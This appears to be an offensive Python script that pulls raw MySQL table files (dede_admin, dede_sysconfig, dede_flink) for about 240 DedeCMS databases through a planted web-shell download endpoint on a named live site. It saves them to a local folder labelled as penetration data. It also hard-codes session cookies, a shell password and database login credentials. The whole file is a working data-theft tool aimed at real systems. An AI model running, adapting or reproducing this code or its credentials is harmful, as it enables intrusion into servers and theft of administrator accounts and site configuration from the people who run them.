#coding:utf-8
from requests_html import HTMLSession
import requests, urllib
import os
import re

session = HTMLSession()

dbnamelist=["a108","a109","a110","a111","a112","a113","a114","a115","a116","a117","a118","a119","a120","a121","a122","a123","a124","a125","a126","a127","a128","a129","a130","a131","a132","a133","a134","a135","a136","a137","a138","a139","a140","a141","a142","a143","a144","a145","a146","a147","a148","a149","a150","a151","a152","a153","a154","a155","a156","a157","a158","a159","a160","a161","a750","s522","s523","s524","s525","s526","s527","s528","s529","s530","s531","s532","s533","s534","s535","s536","s537","s538","s539","s540","s541","s542","s543","s544","s545","s546","s547","s548","s549","s550","s551","s552","s553","s554","s555","s556","s557","s558","s559","s560","s561","s562","s563","s564","s565","s566","s567","s568","s569","s570","s571","s572","s573","s574","s575","s576","s577","s578","s579","s580","s581","s582","s583","s584","s585","s586","s587","s588","s589","s590","s591","s592","s593","s594","s595","s596","s597","s598","s599","s600","s601","s602","s603","s604","s605","s606","s607","s608","s609","s610","s611","s612","s613","s614","s615","s616","s617","s618","s619","s620","s621","s622","s623","s624","s625","s626","s627","s628","s629","s630","s631","s632","s633","s634","s635","s636","s637","s638","s639","s640","s641","s642","s643","s644","s645","s646","s647","s648","s649","s650","s651","s652","s653","s654","s655","s656","s657","s658","s659","s660","s661","s662","s663","s664","s665","s666","s667","s668","s669","s670","s671","s672","s673","s674","s675","s676","s677","s678","s679","s680","s681","s682","s683","s684","s685","s686"]

url_h="http://www.durerchina.com/uploads/170622/Teams.php?down=D%3A%2Fbeifen%2Fmysql%2F"
dede_flink_frm = "dede_flink.frm"
dede_flink_MYD = "dede_flink.MYD"
dede_flink_MYI = "dede_flink.MYI"

dede_admin_frm="dede_admin.frm"
dede_admin_MYD="dede_admin.MYD"
dede_admin_MYI="dede_admin.MYI"

dede_sysconfig_frm="dede_sysconfig.frm"
dede_sysconfig_MYD="dede_sysconfig.MYD"
dede_sysconfig_MYI="dede_sysconfig.MYI"

for dbname in dbnamelist:
    print(dbname)
    urllist=[
        ["{}%2F{}".format(dbname,dede_flink_frm),"{}%2F{}".format(dbname,dede_flink_MYD),"{}%2F{}".format(dbname,dede_flink_MYI),
        "{}%2F{}".format(dbname,dede_admin_frm),"{}%2F{}".format(dbname,dede_admin_MYD),"{}%2F{}".format(dbname,dede_admin_MYI),
        "{}%2F{}".format(dbname,dede_sysconfig_frm),"{}%2F{}".format(dbname,dede_sysconfig_MYD),"{}%2F{}".format(dbname,dede_sysconfig_MYI)]
    ]
    headers={
        "cookie":"envlpass=aafe421b8ad20fe391be17a529c844c2; serveru=www.nsxfgls.com%2Fa%2Fyule%2FTeams.php; serverp=cc11; m_eanverhost=localhost; m_eanverport=3306; m_eanverpass=wanli361361A; m_eanveruser=admin0101; PHPSESSID=atb5vu2eu0msl1pdokqlehjvs2; DedeUserID=1; DedeUserID__ckMd5=4d1f262aec2d6e6b; DedeLoginTime=1560742866; DedeLoginTime__ckMd5=69e3e4dd301d5272"
    }
    # D:\www\备份文件\渗透数据库
    my_file="D:/www/备份文件/渗透数据库/2/{}".format(dbname)
    my_file_name1=my_file+ "/" +dede_flink_frm
    my_file_name2=my_file+ "/" +dede_flink_MYD
    my_file_name3=my_file+ "/" +dede_flink_MYI

    my_file_name4=my_file+ "/" +dede_admin_frm
    my_file_name5=my_file+ "/" +dede_admin_MYD
    my_file_name6=my_file+ "/" +dede_admin_MYI

    my_file_name7=my_file+ "/" +dede_sysconfig_frm
    my_file_name8=my_file+ "/" +dede_sysconfig_MYD
    my_file_name9=my_file+ "/" +dede_sysconfig_MYI

    if not os.path.exists(my_file):
            os.makedirs(my_file)

    for url in urllist:
        response = session.get(url_h+url[0],headers=headers)
        txt = response.content
        with open( my_file_name1,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[1],headers=headers)
        txt = response.content
        with open( my_file_name2,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[2],headers=headers)
        txt = response.content
        with open( my_file_name3,'wb' ) as f:
            f.write(txt)
        response = session.get(url_h+url[3],headers=headers)
        txt = response.content
        with open( my_file_name4,'wb' ) as f:
            f.write(txt)
            
        response = session.get(url_h+url[4],headers=headers)
        txt = response.content
        with open( my_file_name5,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[5],headers=headers)
        txt = response.content
        with open( my_file_name6,'wb' ) as f:
            f.write(txt)
        
        response = session.get(url_h+url[6],headers=headers)
        txt = response.content
        with open( my_file_name7,'wb' ) as f:
            f.write(txt)
            
        response = session.get(url_h+url[7],headers=headers)
        txt = response.content
        with open( my_file_name8,'wb' ) as f:
            f.write(txt)

        response = session.get(url_h+url[8],headers=headers)
        txt = response.content
        with open( my_file_name9,'wb' ) as f:
            f.write(txt)




